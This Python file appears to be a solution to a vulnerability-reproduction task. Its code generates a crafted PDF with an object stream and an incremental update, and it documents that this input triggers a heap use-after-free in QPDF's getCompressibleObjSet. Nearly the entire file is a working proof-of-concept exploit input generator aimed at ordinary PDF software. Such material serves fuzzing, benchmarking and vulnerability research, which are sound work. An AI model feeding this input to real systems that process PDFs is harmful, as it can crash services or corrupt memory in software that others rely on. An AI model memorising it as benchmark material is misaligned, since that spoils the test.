import io
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """

        class PocGenerator:
            """
            A helper class to generate a PDF file that triggers the vulnerability.
            The vulnerability is a heap use-after-free in QPDF::getCompressibleObjSet.
            It's triggered when processing a PDF with an incremental update that
            replaces an object originally stored in an object stream with a new,
            uncompressed object.

            The generated PDF has two parts:
            1. An initial version with an object stream (/ObjStm) and a corresponding
               cross-reference stream (/XRef). The object stream contains several
               compressed objects.
            2. An incremental update appended to the file. This update redefines
               one of the compressed objects as a standalone, uncompressed object.
               It has its own cross-reference stream pointing to the updated object
               and linking to the previous cross-reference stream via the /Prev key.

            This structure causes QPDFWriter to first identify the original compressed
            object as compressible, then delete it from the object cache when it
            processes the update, invalidating an iterator and leading to the UAF.
            """
            def __init__(self):
                self.poc = io.BytesIO()
                self.offsets = {}
                self.stream_objects = {}  # obj_id -> (obj_stream_id, index_in_stream)
                self.max_obj_id_part1 = 0
                self.W = [1, 4, 2] # Field widths for xref entries: type, offset/obj_num, gen/index

            def write(self, data):
                if isinstance(data, str):
                    data = data.encode('latin-1')
                self.poc.write(data)

            def track_obj(self, obj_id, offset):
                self.offsets[obj_id] = offset

            def generate(self) -> bytes:
                self.write(b'%PDF-1.7\n%\xa1\xb2\xc3\xd4\n') # Header and binary comment
                
                self._generate_part1()
                self._generate_part2()

                return self.poc.getvalue()

            def _generate_part1(self):
                # Standard PDF document structure objects
                self.track_obj(1, self.poc.tell())
                self.write(b'1 0 obj\n<</Type /Catalog /Pages 2 0 R>>\nendobj\n')
                self.track_obj(2, self.poc.tell())
                self.write(b'2 0 obj\n<</Type /Pages /Kids [3 0 R] /Count 1>>\nendobj\n')
                self.track_obj(3, self.poc.tell())
                self.write(b'3 0 obj\n<</Type /Page /Parent 2 0 R /MediaBox [0 0 100 100]>>\nendobj\n')

                # An object stream containing multiple compressed objects
                num_stream_objs = 240
                stream_obj_start_id = 10
                obj_stream_id = stream_obj_start_id + num_stream_objs

                stream_index_str = ''
                stream_data_str = ''
                for i in range(num_stream_objs):
                    obj_id = stream_obj_start_id + i
                    self.stream_objects[obj_id] = (obj_stream_id, i)
                    # Add some padding to control the file size
                    obj_data = f'<</ID {obj_id} /Data ({i:0100d})>>'
                    stream_index_str += f'{obj_id} {len(stream_data_str)} '
                    stream_data_str += obj_data
                
                final_stream_content = (stream_index_str + stream_data_str).encode('latin-1')
                first_offset = len(stream_index_str.encode('latin-1'))
                stream_dict = f'<< /Type /ObjStm /N {num_stream_objs} /First {first_offset} /Length {len(final_stream_content)} >>'
                
                self.track_obj(obj_stream_id, self.poc.tell())
                self.write(f'{obj_stream_id} 0 obj\n')
                self.write(stream_dict)
                self.write(b'\nstream\n')
                self.write(final_stream_content)
                self.write(b'\nendstream\nendobj\n')
                
                self.max_obj_id_part1 = obj_stream_id

                # First cross-reference stream, required for object streams
                xref_stream_id = self.max_obj_id_part1 + 1
                
                xref_stream_content = io.BytesIO()
                
                # Entry for object 0 (always free, part of linked list of free objects)
                xref_stream_content.write(struct.pack('>BIH', 0, 0, 65535))

                for i in range(1, self.max_obj_id_part1 + 1):
                    if i in self.offsets: # Uncompressed object (type 1)
                        offset = self.offsets[i]
                        xref_stream_content.write(struct.pack('>BIH', 1, offset, 0))
                    elif i in self.stream_objects: # Compressed object (type 2)
                        strm_id, strm_idx = self.stream_objects[i]
                        xref_stream_content.write(struct.pack('>BIH', 2, strm_id, strm_idx))
                    else: # Free/unused object (type 0)
                        xref_stream_content.write(struct.pack('>BIH', 0, 0, 0))

                xref_stream_data = xref_stream_content.getvalue()
                xref_dict = f"""<< /Type /XRef
   /Size {self.max_obj_id_part1 + 1}
   /W {self.W}
   /Root 1 0 R
   /Length {len(xref_stream_data)}
>>"""
                xref_stream1_offset = self.poc.tell()
                self.track_obj(xref_stream_id, xref_stream1_offset)
                self.write(f'{xref_stream_id} 0 obj\n')
                self.write(xref_dict)
                self.write(b'\nstream\n')
                self.write(xref_stream_data)
                self.write(b'\nendstream\nendobj\n')

                self.write(f'startxref\n{xref_stream1_offset}\n%%EOF\n')
            
            def _generate_part2(self):
                # Incremental update: redefine an object from the stream as uncompressed
                obj_to_update = 15
                self.poc.write(b'\n') # Separate from previous %%EOF
                updated_obj_offset = self.poc.tell()
                self.write(f'{obj_to_update} 0 obj\n<</Updated true /Data ({"X"*500})>>\nendobj\n')
                
                xref_stream1_id = self.max_obj_id_part1 + 1
                xref_stream2_id = xref_stream1_id + 1
                
                xref_stream_content2 = io.BytesIO()
                # This new xref stream only needs an entry for the updated object
                xref_stream_content2.write(struct.pack('>BIH', 1, updated_obj_offset, 0))

                xref_stream_data2 = xref_stream_content2.getvalue()
                
                new_max_obj_id = xref_stream2_id
                
                xref_dict2 = f"""<< /Type /XRef
   /Size {new_max_obj_id + 1}
   /W {self.W}
   /Index [{obj_to_update} 1]
   /Root 1 0 R
   /Prev {self.offsets[xref_stream1_id]}
   /Length {len(xref_stream_data2)}
>>"""
                xref2_offset = self.poc.tell()
                self.write(f'{xref_stream2_id} 0 obj\n')
                self.write(xref_dict2)
                self.write(b'\nstream\n')
                self.write(xref_stream_data2)
                self.write(b'\nendstream\nendobj\n')

                self.write(f'startxref\n{xref2_offset}\n%%EOF\n')


        generator = PocGenerator()
        return generator.generate()